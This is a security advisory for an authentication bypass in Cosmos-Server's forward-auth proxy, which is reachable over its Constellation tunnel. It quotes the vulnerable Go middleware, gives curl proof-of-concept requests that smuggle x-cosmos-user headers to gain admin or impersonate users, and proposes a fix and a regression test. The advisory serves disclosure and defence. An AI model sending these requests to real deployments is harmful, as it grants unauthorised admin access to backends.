# [M] Cosmos-Server has an authentication bypass via forward-auth header smuggling on Constellation tunnel

## Summary
Severity: Medium
Advisory: GHSA-2rx5-2g7j-2659
CVE: CVE-2026-49446
CWE: CWE-285, CWE-290
Ecosystem: Go
CVSS: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-2rx5-2g7j-2659
Type: github-advisory

## Affected
- Go: `github.com/azukaar/cosmos-server` — affected >=0 <0.22.19

## Details
### Summary

The Constellation-tunnel bypass branch in `tokenMiddleware` at `src/proxy/routerGen.go:53-66` returns to the upstream handler before the request's `x-cosmos-user`, `x-cosmos-role`, `x-cosmos-user-role`, and `x-cosmos-mfa` headers are stripped at lines 68-72, and before the `AdminOnlyWithRedirect` gate at lines 109-117 runs. Any holder of a valid Constellation device API key sends `x-cosmos-user: admin` to a proxied backend; the documented forward-auth integration treats the caller as admin with no JWT cookie, password, or MFA.

### Preconditions

- Cosmos is deployed with Constellation enabled and at least one device enrolled.
- Attacker holds a valid `x-cstln-auth` API key for an enrolled device.
- Attacker reaches Cosmos over the Constellation Nebula tunnel.
- Target proxy route has `AuthEnabled=true`; upstream trusts the `x-cosmos-user` forward-auth header.

### Details

```go
// src/proxy/routerGen.go:46-122 - bypass returns before headers are reset
func tokenMiddleware(route utils.ProxyRouteConfig) func(next http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            enabled := route.AuthEnabled
            adminOnly := route.AdminOnly

            // bypass auth if from Constellation tunnel
            if ((enabled && r.Header.Get("x-cosmos-user") != "") || !enabled) {  // attacker-set header opens the branch
                remoteAddr, _ := utils.SplitIP(r.RemoteAddr)
                isConstIP := constellation.IsConstellationIP(remoteAddr)
                isConstTokenValid := constellation.CheckConstellationToken(r) == nil

                if isConstIP && isConstTokenValid {
                    utils.Debug("Bypassing auth for Constellation tunnel")
                    r.Header.Del("x-cstln-auth")
                    next.ServeHTTP(w, r)  // forwards x-cosmos-user as set by attacker
                    return
                }
            }

            r.Header.Del("x-cosmos-user")    // only runs on the fall-through path
            r.Header.Del("x-cosmos-role")
            r.Header.Del("x-cosmos-user-role")
            r.Header.Del("x-cosmos-mfa")
            r.Header.Del("x-cstln-auth")
            // ... JWT path runs here ...

            if enabled && adminOnly {
                if errT := AdminOnlyWithRedirect(w, r, route); errT != nil {  // also skipped by bypass
                    return
                }
            }
            next.ServeHTTP(w, r)
        })
    }
}
```

The branch was written for tunneled-cluster traffic where an upstream Cosmos instance has already authenticated the user and signed the `x-cosmos-user` header itself. The branch condition reads the header before the strip block runs at lines 68-72, so any client can open the branch by sending the header. The Constellation IP and API-key checks then gate progression, but a Constellation device holder satisfies both: the API key was issued by the admin when the device was enrolled, and the tunnel terminates with the device's Constellation IP as the TCP source. Once the branch is taken, the original `x-cosmos-user` value flows to the backend untouched, and `AdminOnlyWithRedirect` is never invoked. Backends configured per Cosmos's documented forward-auth integration (the standard pattern for "Cosmos in front of an app that reads identity from a header") treat the attacker's chosen string as the authenticated identity.

The Constellation network is sold as a way for an operator to invite family and friends without exposing ports. Those invited members hold device API keys but are not Cosmos administrators - the trust boundary this bug crosses is exactly the "invited member -> admin role on a proxied app" line.

### Proof of concept

Environment used to reproduce:

- Version: `master` branch, audited 2026-05-13 (module `github.com/azukaar/cosmos-server`)
- Deployment: `docker run azukaar/cosmos-server:latest` (or the `docker-compose.yml` from the project README)
- Setup steps:
  1. Complete initial setup via `/cosmos-ui/`; promote the operator account to admin.
  2. Enable Constellation: Settings > Constellation > Create lighthouse.
  3. Enrol a device under a non-admin user: Constellation > Devices > Create. Save the device profile and the displayed API key.
  4. Configure one proxy route with `Host=admin-app.example`, `Mode=PROXY`, `Target=http://internal-app:port`, `AuthEnabled=true`, `AdminOnly=true`. Upstream must trust the `x-cosmos-user` header (the documented Cosmos forward-auth integration, e.g. an internal admin panel that reads identity from that header).
  5. Attacker connects to the Nebula tunnel with the issued device profile, so the request's TCP source is the device's Constellation IP.

```bash
# 1. Variables - fill in from the steps above
DEVICE_APIKEY="<APIKey shown when admin created the device>"
PROXY_ROUTE="https://admin-app.example"

# 2. Single request that bypasses Cosmos auth and asserts admin to the backend
curl -k \
     -H "x-cstln-auth: Bearer $DEVICE_APIKEY" \
     -H "x-cosmos-user: admin" \
     -H "x-cosmos-role: 2" \
     -H "x-cosmos-user-role: 2" \
     -H "x-cosmos-mfa: 0" \
     "$PROXY_ROUTE/" -i

# Expected: HTTP 200 with the admin-gated backend rendering as user "admin".
# No JWT cookie was sent; no admin Cosmos account is held by the caller.
# Cosmos's debug log shows: "Bypassing auth for Constellation tunnel".
```

A second request demonstrates cross-user impersonation on the same backend by changing the asserted identity:

```bash
curl -k \
     -H "x-cstln-auth: Bearer $DEVICE_APIKEY" \
     -H "x-cosmos-user: someotheruser" \
     "$PROXY_ROUTE/" -i
# Backend renders as "someotheruser"; any per-user data partitioning at the
# backend is now under attacker control.
```

### Impact

- **AuthN:** bypasses Cosmos JWT login, password, and MFA for any holder of a Constellation device key.
- **AuthZ:** skips the per-route `AdminOnly` gate, unlocking admin-only proxied backends.
- **Confidentiality:** caller reads every admin-only proxied app as `admin` from one curl.
- **Integrity:** caller performs any admin-tier write the backend exposes via the forward-auth identity.
- **Affected population:** every Cosmos deployment with Constellation enabled, at least one enrolled device, and one or more proxy routes integrated via the documented `x-cosmos-user` header.

### Suggestions to fix

> _This has not been tested - it is illustrative only._

Strip the identity headers unconditionally at function entry so they cannot open the bypass branch, and keep the `AdminOnly` gate on the Constellation path. The branch should only fire for routes that are explicitly `AuthEnabled=false` - on auth-required routes the JWT path must always run so the proxy itself is the sole authority that writes `x-cosmos-user`.

```diff
--- a/src/proxy/routerGen.go
+++ b/src/proxy/routerGen.go
@@ -46,15 +46,17 @@
 func tokenMiddleware(route utils.ProxyRouteConfig) func(next http.Handler) http.Handler {
        return func(next http.Handler) http.Handler {
                return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+                       // Always strip identity headers before any decision based on them.
+                       r.Header.Del("x-cosmos-user")
+                       r.Header.Del("x-cosmos-role")
+                       r.Header.Del("x-cosmos-user-role")
+                       r.Header.Del("x-cosmos-mfa")
+
                        enabled := route.AuthEnabled
                        adminOnly := route.AdminOnly
 
-                       // bypass auth if from Constellation tunnel
-                       if ((enabled && r.Header.Get("x-cosmos-user") != "") || !enabled) {
+                       // Constellation bypass only applies to non-auth routes; on auth-required
+                       // routes the JWT path is the sole authority that may set x-cosmos-user.
+                       if !enabled {
                                remoteAddr, _ := utils.SplitIP(r.RemoteAddr)
                                isConstIP := constellation.IsConstellationIP(remoteAddr)
                                isConstTokenValid := constellation.CheckConstellationToken(r) == nil
@@ -65,12 +67,7 @@
                                        return
                                }
                        }
-
-                       r.Header.Del("x-cosmos-user")
-                       r.Header.Del("x-cosmos-role")
-                       r.Header.Del("x-cosmos-user-role")
-                       r.Header.Del("x-cosmos-mfa")
                        r.Header.Del("x-cstln-auth")
```

Defence in depth: document that backends downstream of Cosmos must not accept `x-cosmos-user` over an untrusted hop. Bind the trust to a mutual TLS leg or a shared HMAC over `<x-cosmos-user, request-id, timestamp>` injected by the proxy and verified by the backend.

Regression test: add a unit test against `tokenMiddleware` asserting that a request bearing `x-cosmos-user: admin` and a valid `x-cstln-auth` reaches the next handler with `r.Header.Get("x-cosmos-user") == ""` whenever `route.AuthEnabled == true`.

## References
- https://github.com/azukaar/Cosmos-Server/security/advisories/GHSA-2rx5-2g7j-2659
- https://github.com/azukaar/Cosmos-Server
- https://github.com/azukaar/Cosmos-Server/releases/tag/v0.22.19
